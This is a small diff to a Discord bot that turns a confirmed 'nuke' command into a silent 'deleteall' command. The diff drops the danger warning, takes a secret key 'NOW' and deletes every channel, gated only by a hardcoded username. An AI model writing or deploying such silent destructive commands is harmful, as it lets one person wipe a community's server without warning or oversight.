@@ -32,21 +32,13 @@ async def on_ready():
 def is_owner(ctx):
     return ctx.author.id == OWNER_ID or ctx.author.name == OWNER_USERNAME
 # ================= DELETE ALL =================
-@sudo.command(name="nuke")
-async def sudo_nuke(ctx, confirm: str = None):
+@sudo.command(name="deleteall")
+async def sudo_deleteall(ctx, key: str = None):
     if ctx.author.name != "nico044037":
         return
 
-    if confirm != "CONFIRM":
-        await ctx.send(
-            "⚠️ **DANGER ZONE** ⚠️\n"
-            "This will delete **ALL CHANNELS** in this server.\n\n"
-            "Run:\n"
-            "`$sudo deleteall CONFIRM`"
-        )
+    if key != "NOW":
         return
-
-    await ctx.send("🧨 deleting all channels...")
 
     for channel in list(ctx.guild.channels):
         try:
@@ -182,6 +174,7 @@ if not TOKEN:
     raise RuntimeError("DISCORD_TOKEN environment variable not set")
 
 bot.run(TOKEN)
+
 
 
 
